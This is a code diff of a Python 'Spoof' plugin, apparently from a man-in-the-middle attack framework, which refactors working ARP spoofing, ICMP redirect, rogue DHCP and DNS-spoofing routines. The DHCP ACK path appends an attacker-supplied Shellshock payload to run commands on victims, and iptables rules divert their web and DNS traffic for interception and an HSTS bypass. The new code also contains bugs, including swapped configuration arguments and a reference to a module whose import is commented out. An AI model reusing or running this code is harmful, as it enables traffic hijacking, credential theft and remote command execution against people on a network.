@@ -1,15 +1,15 @@
 #
 # DNS tampering code stolen from https://github.com/DanMcInerney/dnsspoof
 #
-# CredHarvesting code stolen from https://github.com/DanMcInerney/creds.py
-#
 
-from twisted.internet import reactor
-from twisted.internet.interfaces import IReadDescriptor
+#from twisted.internet import reactor
+#from twisted.internet.interfaces import IReadDescriptor
 from plugins.plugin import Plugin
 from time import sleep
 import dns.resolver
-import nfqueue
+#import socket
+from netfilterqueue import NetfilterQueue
+#import nfqueue
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
 from scapy.all import *
@@ -21,343 +21,434 @@ from urllib import unquote
 import binascii
 import random
 
-
 class Spoof(Plugin):
-    name = "Spoof"
-    optname = "spoof"
-    desc = 'Redirect/Modify traffic using ICMP, ARP or DHCP'
-    has_opts = True
+	name     = "Spoof"
+	optname  = "spoof"
+	desc     = 'Redirect/Modify traffic using ICMP, ARP or DHCP'
+	has_opts = True
+	req_root = True
 
-    def initialize(self, options):
-        '''Called if plugin is enabled, passed the options namespace'''
-        self.options = options
-        self.interface = options.interface
-        self.arp = options.arp
-        self.icmp = options.icmp
-        self.dns = options.dns
-        self.dhcp = options.dhcp
-        self.shellshock = options.shellshock
-        self.gateway = options.gateway
-        #self.summary = options.summary
-        self.target = options.target
-        self.arpmode = options.arpmode
-        self.port = options.listen
-        self.hsts = options.hsts
-        self.manualiptables = options.manualiptables  #added by alexander.georgiev@daloo.de
-        self.debug = False
-        self.send = True
+	def initialize(self, options):
+		'''Called if plugin is enabled, passed the options namespace'''
+		self.options = options
+		self.dnscfg = options.configfile['Spoof']['DNS']
+		self.dhcpcfg = options.configfile['Spoof']['DHCP']
+		self.hstscfg = options.configfile['SSLstrip+']
+		self.target = options.target
+		self.manualiptables = options.manualiptables
+		
+		#Makes scapy more verbose
+		debug = False
+		if self.options.log_level is 'debug': 
+			debug = True
 
-        if os.geteuid() != 0:
-            sys.exit("[-] Spoof plugin requires root privileges")
- 
-        if self.options.log_level == 'debug':
-            self.debug = True
+		self.sysconfig = SystemConfig(options.listen)
 
-        try:
-            self.mac = get_if_hwaddr(self.interface)
-        except Exception, e:
-            sys.exit('[-] Error retrieving interfaces MAC address: %s' % e)
-        
-        if self.arp:
-            if not self.gateway:
-                sys.exit("[-] --arp argument requires --gateway")
+		if options.arp:
+			if not options.gateway:
+				sys.exit("[-] --arp argument requires --gateway")
 
-            self.routermac = getmacbyip(self.gateway)
-            
-            print "[*] ARP Spoofing enabled"
-            if self.arpmode == 'req':
-                pkt = self.build_arp_req()
-            elif self.arpmode == 'rep':
-                pkt = self.build_arp_rep()
-            
-            thread_target = self.send_packets
-            thread_args = (pkt, self.interface, self.debug,)
+			self.sysconfig.set_forwarding(1)
+			
+			if not options.manualiptables:
+				self.sysconfig.iptables_flush()
+				self.sysconfig.iptables_http()
 
-        elif self.icmp:
-            if not self.gateway:
-                sys.exit("[-] --icmp argument requires --gateway")
+			self.arp = _ARP(options.gateway, options.interface, options.mac_address)
+			self.arp.target = options.target
+			self.arp.arpmode = options.arpmode
+			self.arp.debug = debug
+			self.arp.start()
 
-            self.routermac = getmacbyip(self.gateway)
+		elif options.icmp:
+			if not options.gateway:
+				sys.exit("[-] --icmp argument requires --gateway")
+			if not options.target:
+				sys.exit("[-] --icmp argument requires --target")
 
-            print "[*] ICMP Redirection enabled"
-            pkt = self.build_icmp()
-            
-            thread_target = self.send_packets
-            thread_args = (pkt, self.interface, self.debug,)
+			self.sysconfig.set_forwarding(1)
+			
+			if not options.manualiptables:
+				self.sysconfig.iptables_flush()
+				self.sysconfig.iptables_http()
 
-        elif self.dhcp:
-            print "[*] DHCP Spoofing enabled"
-            if self.target:
-                sys.exit("[-] --target argument invalid when DCHP spoofing")
+			self.icmp = _ICMP(options.interface, options.target, options.gateway, options.ip_address)
+			self.icmp.debug = debug
+			self.icmp.start()
 
-            self.rand_number = []
-            self.dhcp_dic = {}
-            self.dhcpcfg = options.configfile['Spoof']['DHCP']
-            
-            thread_target = self.dhcp_sniff
-            thread_args = ()
-        
-        else:
-            sys.exit("[-] Spoof plugin requires --arp, --icmp or --dhcp")
+		elif options.dhcp:
+			if options.target:
+				sys.exit("[-] --target argument invalid when DCHP spoofing")
 
-        print "[*] Spoof plugin online"
-        if not self.manualiptables:
-            os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')
+			self.sysconfig.set_forwarding(1)
+			
+			if not options.manualiptables:
+				self.sysconfig.iptables_flush()
+				self.sysconfig.iptables_http()
 
-        if (self.dns or self.hsts):
-            print "[*] DNS Tampering enabled"
-            
-            if self.dns:
-                self.dnscfg = options.configfile['Spoof']['DNS']
+			self.dhcp = _DHCP(options.interface, self.dhcpcfg, options.ip_address, options.mac_address)
+			self.dhcp.shellshock = options.shellshock
+			self.dhcp.debug = debug
+			self.dhcp.start()
+  
+		else:
+			sys.exit("[-] Spoof plugin requires --arp, --icmp or --dhcp")
 
-            self.hstscfg = options.configfile['SSLstrip+']
 
-            if not self.manualiptables:
-                os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
+		if (options.dns or options.hsts):
 
-            self.start_dns_queue()
+			if not options.manualiptables:
+				self.sysconfig.iptables_dns()
 
-        file = open('/proc/sys/net/ipv4/ip_forward', 'w')
-        file.write('1')
-        file.close()
-        if not self.manualiptables:
-            print '[*] Setting up iptables'
-            os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port %s' % self.port)
+			self.dns = _DNS(self.dnscfg, self.hstscfg)
+			self.dns.dns = options.dns
+			self.dns.hsts = options.hsts
+			self.dns.start()
 
-        #CHarvester = CredHarvester()
-        t = threading.Thread(name='spoof_thread', target=thread_target, args=thread_args)
-        #t2 = threading.Thread(name='cred_harvester', target=CHarvester.start, args=(self.interface))
+	def add_options(self, options):
+		group = options.add_mutually_exclusive_group(required=False)
+		group.add_argument('--arp', dest='arp', action='store_true', default=False, help='Redirect traffic using ARP spoofing')
+		group.add_argument('--icmp', dest='icmp', action='store_true', default=False, help='Redirect traffic using ICMP redirects')
+		group.add_argument('--dhcp', dest='dhcp', action='store_true', default=False, help='Redirect traffic using DHCP offers')
+		options.add_argument('--dns', dest='dns', action='store_true', default=False, help='Modify intercepted DNS queries')
+		options.add_argument('--shellshock', type=str, metavar='PAYLOAD', dest='shellshock', default=None, help='Trigger the Shellshock vuln when spoofing DHCP, and execute specified command')
+		options.add_argument('--gateway', dest='gateway', help='Specify the gateway IP')
+		options.add_argument('--target', dest='target', default=None, help='Specify a host to poison [default: subnet]')
+		options.add_argument('--arpmode', dest='arpmode', default='req', choices=["req", "rep"], help=' ARP Spoofing mode: requests (req) or replies (rep) [default: req]')
+		#options.add_argument('--summary', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')
 
-        t.setDaemon(True)
-        t.start()
+		#added by alexander.georgiev@daloo.de
+		options.add_argument('--manual-iptables', dest='manualiptables', action='store_true', default=False, help='Do not setup iptables or flush them automatically')
 
-    def dhcp_rand_ip(self):
-        pool = self.dhcpcfg['ip_pool'].split('-')
-        trunc_ip = pool[0].split('.'); del(trunc_ip[3])
-        max_range = int(pool[1])
-        min_range = int(pool[0].split('.')[3])
-        number_range = range(min_range, max_range)
-        for n in number_range:
-            if n in self.rand_number:
-                number_range.remove(n)
-        rand_number = random.choice(number_range)
-        self.rand_number.append(rand_number)
-        rand_ip = '.'.join(trunc_ip) + '.' + str(rand_number)
+	def finish(self):
+		if self.options.arp:
+			self.arp.stop()
+			sleep(3)
 
-        return rand_ip
+			self.arp.arp_inter = 1
+			if self.target:
+				print "\n[*] Re-ARPing target"
+				self.arp.reArp_target(5)
 
-    def dhcp_callback(self, resp):
-        if resp.haslayer(DHCP):
-            xid = resp[BOOTP].xid
-            mac_addr = resp[Ether].src
-            raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))
-            if xid in self.dhcp_dic.keys():
-                client_ip = self.dhcp_dic[xid]
-            else:
-                client_ip = self.dhcp_rand_ip()
-                self.dhcp_dic[xid] = client_ip
+			print "\n[*] Re-ARPing network" 
+			self.arp.reArp_net(5)
 
-            if resp[DHCP].options[0][1] == 1:
-                logging.info("Got DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
-                logging.info("Sending DHCP OFFER")
-                packet = (Ether(src=get_if_hwaddr(self.interface), dst='ff:ff:ff:ff:ff:ff') /
-                IP(src=get_if_addr(self.interface), dst='255.255.255.255') /
-                UDP(sport=67, dport=68) /
-                BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=get_if_addr(self.interface), xid=xid) /
-                DHCP(options=[("message-type", "offer"),
-                    ('server_id', get_if_addr(self.interface)),
-                    ('subnet_mask', self.dhcpcfg['subnet']),
-                    ('router', get_if_addr(self.interface)),
-                    ('lease_time', 172800),
-                    ('renewal_time', 86400),
-                    ('rebinding_time', 138240),
-                    "end"]))
+		elif self.options.icmp:
+			self.icmp.stop()
+			sleep(3)
 
-                try:
-                    packet[DHCP].options.append(tuple(('name_server', self.dhcpcfg['dns_server'])))
-                except KeyError:
-                    pass
+		if (self.options.dns or self.options.hsts):
+			self.dns.stop()
 
-                sendp(packet, iface=self.interface, verbose=self.debug)
+		if not self.manualiptables:
+			self.sysconfig.iptables_flush()
 
-            if resp[DHCP].options[0][1] == 3:
-                logging.info("Got DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
-                packet = (Ether(src=get_if_hwaddr(self.interface), dst='ff:ff:ff:ff:ff:ff') /
-                IP(src=get_if_addr(self.interface), dst='255.255.255.255') /
-                UDP(sport=67, dport=68) /
-                BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=get_if_addr(self.interface), xid=xid) /
-                DHCP(options=[("message-type", "ack"),
-                    ('server_id', get_if_addr(self.interface)),
-                    ('subnet_mask', self.dhcpcfg['subnet']),
-                    ('router', get_if_addr(self.interface)),
-                    ('lease_time', 172800),
-                    ('renewal_time', 86400),
-                    ('rebinding_time', 138240)]))
+		self.sysconfig.set_forwarding(0)
 
-                try:
-                    packet[DHCP].options.append(tuple(('name_server', self.dhcpcfg['dns_server'])))
-                except KeyError:
-                    pass
+class SystemConfig():
 
-                if self.shellshock:
-                    logging.info("Sending DHCP ACK with shellshock payload")
-                    packet[DHCP].options.append(tuple((114, "() { ignored;}; " + self.shellshock)))
-                    packet[DHCP].options.append("end")
-                else:
-                    logging.info("Sending DHCP ACK")
-                    packet[DHCP].options.append("end")
+	def __init__(self, http_redir_port):
 
-                sendp(packet, iface=self.interface, verbose=self.debug)
+		self.http_redir_port = http_redir_port
 
-    def dhcp_sniff(self):
-        sniff(filter="udp and (port 67 or 68)", prn=self.dhcp_callback, iface=self.interface)
+	def set_forwarding(self, value):
+		with open('/proc/sys/net/ipv4/ip_forward', 'w') as file:
+			file.write(str(value))
+			file.close()
 
-    def send_packets(self, pkt, interface, debug):
-        while self.send:
-            sendp(pkt, inter=2, iface=interface, verbose=debug)
+	def iptables_flush(self):
+		os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')
 
-    def build_icmp(self):
-        pkt = IP(src=self.gateway, dst=self.target)/ICMP(type=5, code=1, gw=get_if_addr(self.interface)) /\
-              IP(src=self.target, dst=self.gateway)/UDP()
+	def iptables_http(self):
+		os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port %s' % self.http_redir_port)
 
-        return pkt
+	def iptables_dns(self):
+		os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
 
-    def build_arp_req(self):
-        if self.target is None:
-            pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac, psrc=self.gateway, pdst=self.gateway)
-        elif self.target:
-            target_mac = getmacbyip(self.target)
-            if target_mac is None:
-                sys.exit("[-] Error: Could not resolve targets MAC address")
+class _DHCP():
 
-            pkt = Ether(src=self.mac, dst=target_mac)/ARP(hwsrc=self.mac, psrc=self.gateway, hwdst=target_mac, pdst=self.target)
+	def __init__(self, interface, dhcpcfg, ip, mac):
+		self.interface   = interface
+		self.ip_address  = ip
+		self.mac_address = mac
+		self.shellshock  = None
+		self.debug       = False
+		self.dhcpcfg     = dhcpcfg
+		self.rand_number = []
+		self.dhcp_dic    = {}
 
-        return pkt
+	def start(self):
+		t = threading.Thread(name="dhcp_spoof", target=self.dhcp_sniff, args=(self.interface,))
+		t.setDaemon(True)
+		t.start()
 
-    def build_arp_rep(self):
-        if self.target is None:
-            pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac, psrc=self.gateway, op=2)
-        elif self.target:
-            target_mac = getmacbyip(self.target)
-            if target_mac is None:
-                sys.exit("[-] Error: Could not resolve targets MAC address")
+	def dhcp_sniff(self, interface):
+		sniff(filter="udp and (port 67 or 68)", prn=self.dhcp_callback, iface=interface)
 
-            pkt = Ether(src=self.mac, dst=target_mac)/ARP(hwsrc=self.mac, psrc=self.gateway, hwdst=target_mac, pdst=self.target, op=2)
+	def dhcp_rand_ip(self):
+		pool = self.dhcpcfg['ip_pool'].split('-')
+		trunc_ip = pool[0].split('.'); del(trunc_ip[3])
+		max_range = int(pool[1])
+		min_range = int(pool[0].split('.')[3])
+		number_range = range(min_range, max_range)
+		for n in number_range:
+			if n in self.rand_number:
+				number_range.remove(n)
+		rand_number = random.choice(number_range)
+		self.rand_number.append(rand_number)
+		rand_ip = '.'.join(trunc_ip) + '.' + str(rand_number)
 
-        return pkt
+		return rand_ip
 
-    def resolve_domain(self, domain):
-        try:
-            #logging.info("Resolving -> %s" % domain)
-            answer = dns.resolver.query(domain, 'A')
-            real_ips = []
-            for rdata in answer:
-                real_ips.append(rdata.address)
+	def dhcp_callback(self, resp):
+		if resp.haslayer(DHCP):
+			xid = resp[BOOTP].xid
+			mac_addr = resp[Ether].src
+			raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))
+			if xid in self.dhcp_dic.keys():
+				client_ip = self.dhcp_dic[xid]
+			else:
+				client_ip = self.dhcp_rand_ip()
+				self.dhcp_dic[xid] = client_ip
 
-            if len(real_ips) > 0:
-                return real_ips
+			if resp[DHCP].options[0][1] is 1:
+				logging.info("Got DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
+				logging.info("Sending DHCP OFFER")
+				packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
+				IP(src=self.ip_address, dst='255.255.255.255') /
+				UDP(sport=67, dport=68) /
+				BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
+				DHCP(options=[("message-type", "offer"),
+					('server_id', self.ip_address),
+					('subnet_mask', self.dhcpcfg['subnet']),
+					('router', self.ip_address),
+					('lease_time', 172800),
+					('renewal_time', 86400),
+					('rebinding_time', 138240),
+					"end"]))
 
-        except Exception:
-            logging.debug("Error resolving " + domain)
+				try:
+					packet[DHCP].options.append(tuple(('name_server', self.dhcpcfg['dns_server'])))
+				except KeyError:
+					pass
 
-    def nfqueue_callback(self, payload, *kargs):
-        data = payload.get_data()
-        pkt = IP(data)
-        if not pkt.haslayer(DNSQR):
-            payload.set_verdict(nfqueue.NF_ACCEPT)
-        else:
-            #logging.info("Got DNS packet for %s %s" % (pkt[DNSQR].qname, pkt[DNSQR].qtype))
-            if self.dns:
-                for k, v in self.dnscfg.items():
-                    if k in pkt[DNSQR].qname:
-                        self.modify_dns(payload, pkt, v)
+				sendp(packet, iface=self.interface, verbose=self.debug)
 
-            elif self.hsts:
-                if (pkt[DNSQR].qtype is 28 or pkt[DNSQR].qtype is 1):
-                    for k,v in self.hstscfg.items():
-                        if v == pkt[DNSQR].qname[:-1]:
-                            ip = self.resolve_domain(k)
-                            if ip:
-                                self.modify_dns(payload, pkt, ip)
+			if resp[DHCP].options[0][1] is 3:
+				logging.info("Got DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
+				packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
+				IP(src=self.ip_address, dst='255.255.255.255') /
+				UDP(sport=67, dport=68) /
+				BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
+				DHCP(options=[("message-type", "ack"),
+					('server_id', self.ip_address),
+					('subnet_mask', self.dhcpcfg['subnet']),
+					('router', self.ip_address),
+					('lease_time', 172800),
+					('renewal_time', 86400),
+					('rebinding_time', 138240)]))
 
-                    if 'wwww' in pkt[DNSQR].qname:
-                        ip = self.resolve_domain(pkt[DNSQR].qname[1:-1])
-                        if ip:
-                            self.modify_dns(payload, pkt, ip)
+				try:
+					packet[DHCP].options.append(tuple(('name_server', self.dhcpcfg['dns_server'])))
+				except KeyError:
+					pass
 
-                    if 'web' in pkt[DNSQR].qname:
-                        ip = self.resolve_domain(pkt[DNSQR].qname[3:-1])
-                        if ip:
-                            self.modify_dns(payload, pkt, ip)
+				if self.shellshock:
+					logging.info("Sending DHCP ACK with shellshock payload")
+					packet[DHCP].options.append(tuple((114, "() { ignored;}; " + self.shellshock)))
+					packet[DHCP].options.append("end")
+				else:
+					logging.info("Sending DHCP ACK")
+					packet[DHCP].options.append("end")
 
-    def modify_dns(self, payload, pkt, ip):
-        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) /\
-        UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\
-        DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd)
+				sendp(packet, iface=self.interface, verbose=self.debug)
 
-        if self.hsts:
-            spoofed_pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip[0]); del ip[0] #have to do this first to initialize the an field
-            for i in ip:
-                spoofed_pkt[DNS].an.add_payload(DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=i))
-            logging.info("%s Resolving %s for HSTS bypass" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
+class _ICMP():
 
-        if self.dns:
-            spoofed_pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip) 
-            logging.info("%s Modified DNS packet for %s" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
+	def __init__(self, interface, target, gateway, ip_address):
 
-        payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
+		self.target        = target
+		self.gateway       = gateway
+		self.interface     = interface
+		self.ip_address    = ip_address
+		self.debug         = False
+		self.send          = True
+		self.icmp_interval = 2
 
-    def start_dns_queue(self):
-        self.q = nfqueue.queue()
-        self.q.set_callback(self.nfqueue_callback)
-        self.q.fast_open(0, socket.AF_INET)
-        self.q.set_queue_maxlen(5000)
-        reactor.addReader(self)
-        self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
+	def build_icmp(self):
+		pkt = IP(src=self.gateway, dst=self.target)/ICMP(type=5, code=1, gw=self.ip_address) /\
+			  IP(src=self.target, dst=self.gateway)/UDP()
 
-    def fileno(self):
-        return self.q.get_fd()
+		return pkt
 
-    def doRead(self):
-        self.q.process_pending(100)
+	def start(self):
+		pkt = self.build_icmp()
 
-    def connectionLost(self, reason):
-        reactor.removeReader(self)
+		t = threading.Thread(name='icmp_spoof', target=self.send_icmps, args=(pkt, self.interface, self.debug,))
+		t.setDaemon(True)
+		t.start()
 
-    def logPrefix(self):
-        return 'queue'
+	def stop(self):
+		self.send = False
 
-    def add_options(self, options):
-        group = options.add_mutually_exclusive_group(required=False)
-        group.add_argument('--arp', dest='arp', action='store_true', default=False, help='Redirect traffic using ARP spoofing')
-        group.add_argument('--icmp', dest='icmp', action='store_true', default=False, help='Redirect traffic using ICMP redirects')
-        group.add_argument('--dhcp', dest='dhcp', action='store_true', default=False, help='Redirect traffic using DHCP offers')
-        options.add_argument('--dns', dest='dns', action='store_true', default=False, help='Modify intercepted DNS queries')
-        options.add_argument('--shellshock', type=str, metavar='PAYLOAD', dest='shellshock', default=None, help='Trigger the Shellshock vuln when spoofing DHCP, and execute specified command')
-        options.add_argument('--gateway', dest='gateway', help='Specify the gateway IP')
-        options.add_argument('--target', dest='target', help='Specify a host to poison [default: subnet]')
-        options.add_argument('--arpmode', dest='arpmode', default='req', help=' ARP Spoofing mode: requests (req) or replies (rep) [default: req]')
-        options.add_argument('--manual-iptables', dest='manualiptables', action='store_true', default=False, help='Do not setup iptables or flush them automatically')
-        #options.add_argument('--summary', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')
+	def send_icmps(self, pkt, interface, debug):
+		while self.send:
+			sendp(pkt, inter=self.icmp_interval, iface=interface, verbose=debug)
 
-    def finish(self):
-        self.send = False
-        sleep(3)
-        file = open('/proc/sys/net/ipv4/ip_forward', 'w')
-        file.write('0')
-        file.close()
-        if not self.manualiptables:
-            print '\n[*] Flushing iptables'
-            os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')
+class _ARP():
 
-        if (self.dns or self.hsts):
-            try:
-                self.q.unbind(socket.AF_INET)
-                self.q.close()
-            except:
-                pass
+	def __init__(self, gateway, interface, mac):
 
-        if self.arp:
-            print '[*] Re-arping network'
-            pkt = Ether(src=self.routermac, dst='ff:ff:ff:ff:ff:ff')/ARP(psrc=self.gateway, hwsrc=self.routermac, op=2)
-            sendp(pkt, inter=1, count=5, iface=self.interface)
+		self.gateway    = gateway
+		self.gatewaymac = getmacbyip(gateway)
+		self.mac        = mac
+		self.target     = None
+		self.targetmac  = None
+		self.interface  = interface
+		self.arpmode    = 'req'
+		self.debug      = False
+		self.send       = True
+		self.arp_inter  = 2
+
+	def start(self):
+		if self.gatewaymac is None:
+			sys.exit("[-] Error: Could not resolve gateway's MAC address")
+
+		if self.target:
+			self.targetmac = getmacbyip(self.target)
+			if self.targetmac is None:
+				sys.exit("[-] Error: Could not resolve target's MAC address")
+
+		if self.arpmode is 'req':
+			pkt = self.build_arp_req()
+		
+		elif self.arpmode is 'rep':
+			pkt = self.build_arp_rep()
+
+		t = threading.Thread(name='arp_spoof', target=self.send_arps, args=(pkt, self.interface, self.debug,))
+		t.setDaemon(True)
+		t.start()
+
+	def send_arps(self, pkt, interface, debug):
+		while self.send:
+			sendp(pkt, inter=self.arp_inter, iface=interface, verbose=debug)
+
+	def stop(self):
+		self.send = False
+
+	def build_arp_req(self):
+		if self.target is None:
+			pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac, psrc=self.gateway, pdst=self.gateway)
+		elif self.target:
+			pkt = Ether(src=self.mac, dst=self.targetmac)/\
+			ARP(hwsrc=self.mac, psrc=self.gateway, hwdst=self.targetmac, pdst=self.target)
+
+		return pkt
+
+	def build_arp_rep(self):
+		if self.target is None:
+			pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac, psrc=self.gateway, op=2)
+		elif self.target:
+			pkt = Ether(src=self.mac, dst=self.targetmac)/\
+			ARP(hwsrc=self.mac, psrc=self.gateway, hwdst=self.targetmac, pdst=self.target, op=2)
+
+		return pkt
+
+	def reArp_net(self, count):
+		pkt = Ether(src=self.gatewaymac, dst='ff:ff:ff:ff:ff:ff')/\
+		ARP(psrc=self.gateway, hwsrc=self.gatewaymac, op=2)
+
+		sendp(pkt, inter=self.arp_inter, count=count, iface=self.interface)
+
+	def reArp_target(self, count):
+		pkt = Ether(src=self.gatewaymac, dst='ff:ff:ff:ff:ff:ff')/\
+		ARP(psrc=self.target, hwsrc=self.targetmac, op=2)
+
+		sendp(pkt, inter=self.arp_inter, count=count, iface=self.interface)
+
+class _DNS():
+
+	def __init__(self, hstscfg, dnscfg):
+		self.hsts = False
+		self.dns = True
+		self.dnscfg = hstscfg
+		self.hstscfg = dnscfg
+		self.nfqueue = NetfilterQueue()
+
+	def start(self):
+		t = threading.Thread(name='dns_nfqueue', target=self.nfqueue_bind, args=())
+		t.setDaemon(True)
+		t.start()
+
+	def nfqueue_bind(self):
+		self.nfqueue.bind(1, self.nfqueue_callback, 5000, 3)
+		self.nfqueue.run()
+
+	def stop(self):
+		try:
+			self.nfqueue.unbind()
+		except:
+			pass
+
+	def resolve_domain(self, domain):
+		try:
+			logging.debug("Resolving -> %s" % domain)
+			answer = dns.resolver.query(domain, 'A')
+			real_ips = []
+			for rdata in answer:
+				real_ips.append(rdata.address)
+
+			if len(real_ips) > 0:
+				return real_ips
+
+		except Exception:
+			logging.info("Error resolving " + domain)
+
+	def nfqueue_callback(self, payload):
+		if payload:
+			print "got packet!"
+		data = payload.get_payload()
+		pkt = IP(data)
+		if not pkt.haslayer(DNSQR):
+			payload.accept()
+		else:
+			logging.debug("Got DNS packet for %s %s" % (pkt[DNSQR].qname, pkt[DNSQR].qtype))
+			if self.dns:
+				for k, v in self.dnscfg.items():
+					if k in pkt[DNSQR].qname:
+						self.modify_dns(payload, pkt, v)
+
+			elif self.hsts:
+				if (pkt[DNSQR].qtype is 28 or pkt[DNSQR].qtype is 1):
+					for k,v in self.hstscfg.items():
+						if v == pkt[DNSQR].qname[:-1]:
+							ip = self.resolve_domain(k)
+							if ip:
+								self.modify_dns(payload, pkt, ip)
+
+					if 'wwww' in pkt[DNSQR].qname:
+						ip = self.resolve_domain(pkt[DNSQR].qname[1:-1])
+						if ip:
+							self.modify_dns(payload, pkt, ip)
+
+					if 'web' in pkt[DNSQR].qname:
+						ip = self.resolve_domain(pkt[DNSQR].qname[3:-1])
+						if ip:
+							self.modify_dns(payload, pkt, ip)
+
+	def modify_dns(self, payload, pkt, ip):
+		spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) /\
+		UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\
+		DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd)
+
+		if self.hsts:
+			spoofed_pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip[0]); del ip[0] #have to do this first to initialize the an field
+			for i in ip:
+				spoofed_pkt[DNS].an.add_payload(DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=i))
+			logging.info("%s Resolving %s for HSTS bypass" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
+			payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
+
+		if self.dns:
+			spoofed_pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip) 
+			logging.info("%s Modified DNS packet for %s" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
+			payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
